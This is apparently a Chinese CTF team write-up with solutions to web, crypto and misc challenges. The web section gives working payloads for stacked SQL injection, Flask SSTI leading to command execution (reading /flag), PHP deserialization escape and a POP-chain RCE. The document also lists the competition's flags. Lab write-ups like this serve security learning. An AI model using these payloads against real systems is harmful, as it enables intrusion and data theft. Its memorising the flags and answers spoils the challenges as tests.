---
team: flag_小白预定
members:
    - 勇少
    - 见尘
    - 望月夏芽
---

## SIGN IN

### Starting Point | Author:望月夏芽

F12，ctrl+U

## Web 

### id_wife | Author:勇少、望月夏芽

堆叠注入

最开始没想到堆叠，跑去盲注，差点怀疑人生
测出来堆叠之后就简单了，其他过滤什么我不知道，直接参考新春战疫的一道sqli，Handler一把梭

```
frank');handler `1145141919810` open;handler `1145141919810` read first;handler `1145141919810` read next;#
```

minil{4cc5cda6-30c6-48ff-ab4e-9c2830005191}

### Personal_IP_Query | Author:勇少

flaskSSTI，绕过下划线、单双引号

显示Your Ip IS……马上想到XFF头，伪造之后发现输入的XFF头显示出来了，输入 `{{2+2}}` 之后回显的 `4` ，直接实锤

playload：
```
?x1=__class__&x2=__base__&x3=__subclasses__&x4=__getitem__&x5=__init__
&x6=__globals__&x7=__builtins__&x8=eval&x9=__import__("os").popen('cat+/flag').read()

X-Forwarded-For:{{()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()|attr(request.args.x4)(174)|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)(request.args.x7)|attr(request.args.x4)(request.args.x8)(request.args.x9)}}
```

### ezbypass | Author:勇少

过滤逗号等号的无列名注入，PHP反序列化字符逃逸

注入做的非预期：
```
logname=1"||1 limit 1 offset 3#&logpass=1
```
得到`alert('Username:Flag_1s_heRe \nPassword:goto /flag327a6c4304a')`，访问。

```
$key = array('php','flag','xdsec');
$filter = '/'.implode('|',$key).'/i';
return preg_replace($filter,'hack!!!!',$payload);
```

php 关键字被替换为 hack!!!! 之后，从3个字符变成了5个字符，但是反序列化的时候由于 s:3 的存在，这个值仍然会被当作三个字符来处理，造成逃逸。
```
payload=phpphpphpphpphpphpphp";s:3:"V0n";s:14:"has_girlfriend";}
```

minil{7f3ea366-f5ab-463c-b511-af63d6dc7715}

### Let’s_Play_Dolls | Author:勇少

PHP无参数RCE、pop链

pop链利用：
```
$pop = new foo3;
$pop->var = new foo2;//触发__toString()，调用execute()
$pop->var->obj = new foo1;//调用foo1的execute()
```

`if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $this->var))` 限制了参数，意思是我们可以 `a();`  `a(a());` 但是不能 `a('1');`

playload：
```
foo1的var属性:
print_r(readfile(end(scandir(current(localeconv())))));
```

echo serialize($pop)之后，需要绕过 __wakeup() 才行

minil{af22c569-6114-44c6-8c8c-4b561cf7ac7b}


## Crypto

### f**k&base | Author:勇少、见尘

题目中已经给出了私钥 **( f , g )** 所以解密非常简单，下面推导一下：

$$
\begin{aligned}
e &\equiv rh+m \ &(mod \ q) \\
&\equiv \frac{rg}{f}+m \ &(mod \ q)
\end{aligned}
$$
两边同时乘 $f$:
$$
\tag{1}ef \equiv rg+mf \ (mod \ q) \\
$$
这时注意到 $g$ 的范围：
$$
\sqrt{\frac{q}{4}}<g<\sqrt{\frac{q}{2}}
$$
所以:
$$
rg+fm<\sqrt{\frac{q}{2}}\sqrt{\frac{q}{2}}+\sqrt{\frac{q}{2}}\sqrt{\frac{q}{4}}<q
$$
那么同余式 $(1)$，可以直接看做等式：
$$
\tag{2}ef = rg+mf
$$
接下来只需计算：
$$
(ef)f^{-1}
\equiv (rg+mf)f^{-1}
\equiv rgf^{-1}+mff^{-1} 
\equiv mff^{-1}
\equiv m \ (mod\ g)
$$
就得到明文了。

exp：

```python
from Crypto.Util.number import long_to_bytes,inverse
f = 4685394431238242086047454699939574117865082734421802876855769683954689809016908045500281898911462887906190042764753834184270447603004244910544167081517863
g = 5326402554595682620065287001809742915798424911036766723537742672943459577709829465021452623299712724999868094408519004699993233519540500859134358256211397
q = 172620634756442326936446284386446310176482010539257694929884002472846127607264743380697653537447369089693337723649017402105400257863085638725058903969478143249108126132543502414741890867122949021941524916405444824353100158506448429871964258931750339247018885114052623963451658829116065142400435131369957050799
e = 130055004464808383851466991915980644718382040848563991873041960765504627910537316320531719771695727709826775790697704799143461018934672453482988811575574961674813001940313918329737944758875566038617074550624823884742484696611063406222986507537981571075140436761436815079809518206635499600341038593553079293254
m = (e*f % q) % g
m *= inverse(f, g)
print(long_to_bytes(m % g))
## y0u_ar3_s0_f@st
```

minil{y0u_ar3_s0_f@st}

### trylll | Author:勇少、见尘

这一题和上面是同一个加密模型，但是只给出了公钥 **( q , h )** ，私钥是可以从公钥中计算出来的。找到这两个数量级为 $\sqrt{q}$ 的私钥 **( f , g )** 即可和上一题一样解密。（甚至通过 h 找到完全符合条件的 (F,G) 也可以）

$$
F(1,h)-R(0,q)=(F,G)
$$

(F,G) 为这个二维的格 {(1,h),(0,q)} 上的最短向量，所以这是一个二维格上的SVP。所以可以不用 LLL，Gaussian Lattice Reduction 就可以了。

exp：

```python
from gmpy2 import iroot, sqrt
from Crypto.Util.number import *
q = 126982824744410328945797087760338772632266265605499464155168564006938381164343998332297867219509875837758518332737386292044402913405044815273140449332476472286262639891581209911570020757347401235079120185293696746139599783586620242086604902725583996821566303642800016358224555557587702599076109172899781757727
h = 31497596336552470100084187834926304075869321337353584228754801815485197854209104578876574798202880445492465226847681886628987815101276129299179423009194336979092146458547058477361338454307308727787100367492619524471399054846173175096003547542362283035506046981301967777510149938655352986115892410982908002343
e = 81425203325802096867547935279460713507554656326547202848965764201702208123530941439525435560101593619326780304160780819803407105746324025686271927329740552019112604285594877520543558401049557343346169993751022158349472011774064975266164948244263318723437203684336095564838792724505516573209588002889586264735

def gaussian(v1, v2):
    while True:
        if sqrt(v2[0]**2+v2[1]**2) < sqrt(v1[0]**2+v1[1]**2):
            v1, v2 = v2, v1
        m = int((v1[0]*v2[0]+v1[1]*v2[1])/(v1[0]**2+v1[1]**2))
        if m == 0:
            return (v1, v2)
        v2 = [v2[0]-m*v1[0], v2[1]-m*v1[1]]

s1, s2 = gaussian([1, h], [0, q])
f, g = s1[0], s1[1]

m = (e*f % q) % g
m *= inverse(f, g)
print(long_to_bytes(m % g))
# l1Ii5n0tea5y
```

minil{l1Ii5n0tea5y}

## MISC

### MITM_0 | Author:见尘

下载文件包，用wireshark打开后，常规流程，先看协议分级

主要数据保存在ipv4中，跟据提示

```
Is HTTPS really safe?Fine the bad guy~
format:minil{XXX}

下载文件：MIMT.pcap.zip

中间人欺骗有几种方案？
```

想到查找中间人的ip地址，于是筛选出http信息，可以看到虽然https为加密，但明显有受害者将流量发送到中间人转发的过程

即找到bad_gay ip：`192.168.1.152`，经过base64加密即得到flag。

### MITM_1 | Author:见尘

同上先看协议分级，然后将大部分数据进行过滤选中。因为得到提示是伪证书，所以应用wireshark的语法筛选--关键字Certificate。

恕我直言有些侥幸，liuyukun的名字实在是很明显的伪证书，答案即为liuyukun CA的base64编码。
此题确有侥幸，之后会看其他大佬思路。


### MiniGameHacking | Author:勇少

啊这……data那个文件里面，直接翻就有flag……这波是？

